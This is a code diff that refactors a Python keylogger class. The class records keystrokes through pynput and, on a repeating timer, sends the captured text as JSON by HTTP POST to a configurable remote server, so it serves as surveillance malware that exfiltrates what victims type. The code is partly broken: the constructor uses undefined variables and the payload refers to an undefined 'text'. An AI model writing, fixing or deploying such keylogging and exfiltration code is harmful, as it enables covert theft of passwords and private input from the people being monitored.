@@ -1,31 +1,32 @@
+from pynput import keyboard
+
+import requests
+
+import json
+
+import threading
+
 class KeyLogger:
 
-    from pynput import keyboard
-
-    import requests
-
-    import json
-
-    import threading
-
-
-    # global variable text where keystrokes are saved as a string which is sent to server
-    text = ""
-
-    ip_address =    
-    port_number = 
-    time_interval = 
-
-    def send_post_req():
+    def __init__(self):
+        # global variable text where keystrokes are saved as a string which is sent to server
+        self.server_ip = server_ip  
+        self.port = port
+        self.interval = interval
+        self.text = ""
+    
+    def _send_post_request(self):
+        payload = json.dumps({"keyboardData": text})
         try:
-            payload = json.dumps({"keyboardData": text})
-            
-            req = requests.post(f"http://{ip_address}:{port_number}", data=payload, headers={"Content-Type" : "application/json"})
-
-            timer = threading.Timer(time_interval, send_post_req)
-
-            timer.start()
-
+            requests.post(f"http://{self.server_ip}:{self.port}", 
+                          data=payload, 
+                          headers={"Content-Type" : "application/json"}
+                          )
         except:
-            print("Couldn't complete request!")
+            print("Failed to send log!")
+
+        finally:
+            self.text = ""
+            timer = threading.Timer(self.interval, self._send_post_request)
+            timer.start()
 
